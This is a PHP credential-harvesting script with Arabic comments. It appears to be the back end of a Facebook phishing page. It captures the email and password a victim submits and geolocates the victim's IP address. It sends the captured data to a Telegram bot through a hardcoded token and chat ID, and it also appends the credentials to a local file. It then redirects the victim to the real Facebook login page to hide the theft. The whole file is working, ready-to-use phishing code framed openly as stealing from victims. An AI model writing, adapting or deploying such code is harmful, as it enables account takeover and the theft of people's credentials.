<?php
// login.php - معالج تسجيل الدخول وإرسال البيانات إلى تليجرام

// إعدادات البوت - استبدلها ببياناتك الخاصة
$BOT_TOKEN = "8736299849:AAFnbikAAbLIs8Yhe2vOUAeFT6ir460V5vc";  // ضع توكن البوت هنا
$CHAT_ID = "8248335592";  // ضع معرف الشات هنا

// الحصول على بيانات الضحية
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

// الحصول على معلومات الموقع من IP (اختياري)
$geo_data = @file_get_contents("http://ip-api.com/json/{$ip}");
$geo = json_decode($geo_data, true);

$location = "";
if ($geo && $geo['status'] == 'success') {
    $location = "🌍 {$geo['city']}, {$geo['country']}";
}

// تنسيق الرسالة المرسلة إلى تليجرام
$message = "
🔐 [ FACEBOOK HIJACKED ] 🔐
━━━━━━━━━━━━━━━━━━━━━
📧 البريد: {$email}
🔑 كلمة المرور: {$password}
🖥️ IP: {$ip}
{$location}
📱 الجهاز: {$user_agent}
⏰ الوقت: {$date}
━━━━━━━━━━━━━━━━━━━━━
✅ STATUS: COMPROMISED
";

// إرسال إلى تليجرام
function sendToTelegram($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}

// حفظ نسخة احتياطية في ملف محلي
$backup_data = "[" . date('Y-m-d H:i:s') . "] Email: {$email} | Pass: {$password} | IP: {$ip}\n";
file_put_contents('credentials.txt', $backup_data, FILE_APPEND);

// إرسال البيانات إلى التليجرام
sendToTelegram($BOT_TOKEN, $CHAT_ID, $message);

// إعادة توجيه الضحية إلى فيسبوك الحقيقي بعد السرقة
header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
exit();
?>